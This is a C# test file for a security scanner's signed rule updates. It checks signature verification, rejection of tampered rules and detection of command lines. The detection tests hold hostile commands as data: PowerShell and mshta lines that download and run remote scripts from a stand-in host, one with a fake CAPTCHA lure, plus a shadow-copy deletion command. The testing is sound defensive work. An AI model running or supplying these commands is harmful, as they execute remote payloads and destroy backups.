using System.Text;
using ScanMe.Core.Knowledge;
using ScanMe.Core.Updates;

namespace ScanMe.Tests;

/// <summary>Online-Regeln duerfen nur mit gueltiger Signatur wirken und nur ergaenzen.</summary>
public class RuleUpdateTests
{
    private static string RepoRules
    {
        get
        {
            var dir = new DirectoryInfo(AppContext.BaseDirectory);
            while (dir != null && !File.Exists(Path.Combine(dir.FullName, "ScanMe.sln"))) dir = dir.Parent;
            return Path.Combine(dir?.FullName ?? ".", "rules", "rules.json");
        }
    }

    [Fact]
    public void PublishedRules_HaveValidSignature()
    {
        byte[] data = File.ReadAllBytes(RepoRules);
        Assert.True(RuleSigning.Verify(data, File.ReadAllText(RepoRules + ".sig")),
            "rules/rules.json wurde geändert, aber nicht neu signiert (scanme-cli --rules-sign rules/rules.json).");
    }

    [Fact]
    public void TamperedRules_AreRejected()
    {
        byte[] data = File.ReadAllBytes(RepoRules);
        string sig = File.ReadAllText(RepoRules + ".sig");
        var tampered = Encoding.UTF8.GetBytes(Encoding.UTF8.GetString(data).Replace("\"weight\": 55", "\"weight\": 0"));
        Assert.False(RuleSigning.Verify(tampered, sig));
    }

    [Theory]
    [InlineData("powershell -w h -c \"iwr https://x.example/a.ps1 | iex\" # ✅ I am not a robot - Verification ID: 4821", "NET_CLICKFIX_CAPTCHA")]
    [InlineData("mshta https://x.example/check.hta", "NET_MSHTA_REMOTE_ANY")]
    [InlineData("powershell -c \"irm https://x.example/s | iex\"", "NET_PS_IWR_PIPE_IEX")]
    public void PublishedRules_DetectClickFix(string command, string ruleId)
    {
        RuleStore.Apply(RuleStore.Parse(File.ReadAllBytes(RepoRules)));
        try { Assert.Contains(CommandLineRules.Match(command), r => r.Id == ruleId); }
        finally { RuleStore.Apply(new RuleSet()); }
    }

    [Fact]
    public void ForeignKey_IsRejected()
    {
        var (otherPrivate, _) = RuleSigning.GenerateKeyPair();
        byte[] data = Encoding.UTF8.GetBytes("{\"version\": 999}");
        Assert.False(RuleSigning.Verify(data, RuleSigning.Sign(data, otherPrivate)));
    }

    [Fact]
    public void OnlineRules_ExtendDetection_AndAreClamped()
    {
        var set = new RuleSet
        {
            Version = 1,
            CommandLineRules =
            [
                new CommandLineRuleDto { Id = "TEST_X", Pattern = "scanme-testmarker-[0-9]+", Weight = 500, Text = "Test" },
                new CommandLineRuleDto { Id = "BROKEN", Pattern = "([", Weight = 10, Text = "ungültiger Regex wird ignoriert" },
            ],
        };
        RuleStore.Apply(set);
        try
        {
            var hit = CommandLineRules.Match("cmd /c scanme-testmarker-42").Single(r => r.Id == "NET_TEST_X");
            Assert.Equal(90, hit.Weight);
            // Eingebaute Regeln bleiben aktiv
            Assert.Contains(CommandLineRules.Match("vssadmin delete shadows /all"), r => r.Id == "SHADOW_DELETE");
        }
        finally
        {
            RuleStore.Apply(new RuleSet());
        }
    }
}
